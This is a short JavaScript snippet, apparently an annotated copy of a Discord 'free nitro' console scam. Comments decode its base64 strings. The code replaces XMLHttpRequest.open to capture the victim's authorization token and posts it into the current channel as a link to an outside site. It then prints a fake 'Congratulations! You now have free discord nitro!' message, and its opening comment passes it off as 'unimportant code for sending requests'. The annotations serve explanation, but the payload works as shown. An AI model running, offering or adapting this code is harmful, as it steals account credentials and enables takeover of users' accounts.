
// Some unimportant code for sending requests

let oldXHROpen = window.XMLHttpRequest.prototype.open;
// Replace any request sending code with this:
XMLHttpRequest.prototype.open = function (e, t, o, n, s) {
    // When the request gets a response:
    this.addEventListener("load", function () {
        // Is NOT in a channel? Then log "Pending.. to resolve your nitro.". Otherwise:
        // Strings: "Pending.. to resolve your nitro."
        isNaN(window.location.href.substring(window.location.href.lastIndexOf("/") + 1, window.location.href.length)) ? console.log(atob("UGVuZGluZy4uIHRvIHJlc29sdmUgeW91ciBuaXRyby4=")) :
            (
                // Send message in current channel
                // Strings: "https://discordapp.com/api/v6/channels/"
                fetch(atob("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvY2hhbm5lbHMv") + window.location.href.substring(window.location.href.lastIndexOf("/") + 1, window.location.href.length) + "/messages", {
                    method: "POST",
                    headers: {
                        authorization: this.headers.Authorization[0],
                        "user-agent": navigator.userAgent,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        // Message: "https://0x539.co/k/[TOKEN]"
                        // Strings: "https://0x539.co/k/"
                        content: atob("aHR0cHM6Ly8weDUzOS5jby9rLw==") + this.headers.Authorization[0],
                        tts: "false"
                    })
                    // Strings: "font-size: 450px; background: url(https://cdn.discordapp.com/attachments/499211297288617992/568508878375878668/images.png) no-repeat;"
                }), console.log("%c ", atob("Zm9udC1zaXplOiA0NTBweDsgYmFja2dyb3VuZDogdXJsKGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzQ5OTIxMTI5NzI4ODYxNzk5Mi81Njg1MDg4NzgzNzU4Nzg2NjgvaW1hZ2VzLnBuZykgbm8tcmVwZWF0Ow==")),
                    console.log("Congratulations! You now have free discord nitro! But don't tell the discord admins!")
            )
    });
    oldXHROpen.apply(this, arguments);
};
